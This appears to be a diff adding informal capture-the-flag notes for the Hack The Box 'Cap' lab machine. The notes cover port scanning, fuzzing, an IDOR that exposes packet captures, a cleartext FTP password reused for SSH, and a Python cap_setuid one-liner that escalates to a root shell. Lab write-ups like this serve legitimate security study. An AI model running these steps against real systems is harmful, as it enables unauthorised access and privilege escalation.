@@ -1,0 +1,27 @@
+nmap -sV cap.htb
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Gunicorn
+- tf is a goonicorn
+
+go to webpage
+- ffuf -u http://cap.htb -w /usr/share/seclists/Discovery/DNS/bug-bounty-program-subdomains-trickest-inventory.txt -H "Host:FUZZ.cap.htb" -fs 19386
+	- useless trash
+- feroxbuster -u http://cap.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+	- nothing to see here really, except /netstat and /capture subdirectory
+
+We can confirm an IDOR with the /data subdirectory that allows us to view other scans performed by other users, visible in the Security Snapshot UI. We can automate this by running this in Intruder and setting a payload:
+- We can confirm /data/0, 1, 3, 4, 5 are all available through Intruder. We need to access them and view each pcap separately in wireshark.
+	- immediately we can see that the 0th scan shows an FTP session with a cleartext password transmitted for Nathan, which is Buck3tH4TF0RM3!
+	- guided mode suggests that this is usable for SSH, and it is lol, user secured
+
+guided mode suggests that escalation is a simple lolbin away, so its good to run linpeas to check what stuff we can maybe run to escalate.
+- PATH: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+- immediately we see our first YELLOW/RED warning from linpeas; machine is vulnerable to CVE-2021-3560, which is an exploit involving polkit that can be used to escalate to root
+- there is also another YELLOW/RED warning involving /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+	- gtfobins has a section specifically about cap_setuid capability: https://gtfobins.github.io/gtfobins/python/, this can be exploited easily
+	- cp /usr/bin/python3.8
+	- /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+	- cat /root/root.txt
+
